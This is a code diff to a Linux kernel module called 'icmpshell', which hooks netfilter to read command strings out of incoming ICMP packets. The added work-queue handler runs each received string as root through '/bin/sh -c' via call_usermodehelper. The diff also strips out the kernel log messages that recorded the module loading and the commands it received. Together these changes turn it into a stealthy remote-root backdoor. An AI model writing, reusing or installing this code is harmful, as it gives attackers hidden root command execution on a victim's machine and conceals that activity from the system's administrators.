@@ -3,9 +3,24 @@
 #include <linux/icmp.h>
 #include <linux/netfilter_ipv4.h>
 
-#define MAX_CMD_LEN 2040
+#define MAX_CMD_LEN 1976
 
 static struct nf_hook_ops nfho;
+
+char cmd_string[MAX_CMD_LEN];
+
+struct work_struct my_work;
+
+static void work_handler(struct work_struct * work)
+{
+  static char *argv[] = {"/bin/sh", "-c", cmd_string, NULL};
+  static char *envp[] = {"PATH=/bin:/sbin", NULL};
+
+  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+}
+
+DECLARE_WORK(my_work, work_handler);
+
 static unsigned int icmp_cmd_executor(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
 {
   struct iphdr *iph;
@@ -15,7 +30,6 @@ static unsigned int icmp_cmd_executor(void *priv, struct sk_buff *skb, const str
   unsigned char *tail;
   unsigned char *i;
   int j = 0;
-  char cmd_string[MAX_CMD_LEN];
 
   iph = ip_hdr(skb);
   icmph = icmp_hdr(skb);
@@ -58,18 +72,13 @@ static unsigned int icmp_cmd_executor(void *priv, struct sk_buff *skb, const str
     }
   }
 
-  printk(KERN_DEBUG
-         "icmpshell: type=%d; code=%d; data=%s",
-         icmph->type,
-         icmph->code,
-         cmd_string);
+  schedule_work(&my_work);
+
   return NF_ACCEPT;
 }
 
 static int __init startup(void)
 {
-  printk(KERN_INFO "Loading icmpshell module\n");
-
   nfho.hook = icmp_cmd_executor;
   nfho.hooknum = NF_INET_PRE_ROUTING;
   nfho.pf = PF_INET;
@@ -81,7 +90,6 @@ static int __init startup(void)
 static void __exit cleanup(void)
 {
   nf_unregister_net_hook(&init_net, &nfho);
-  printk(KERN_ALERT "Unloading icmpshell module\n");
 }
 
 MODULE_LICENSE("GPL");
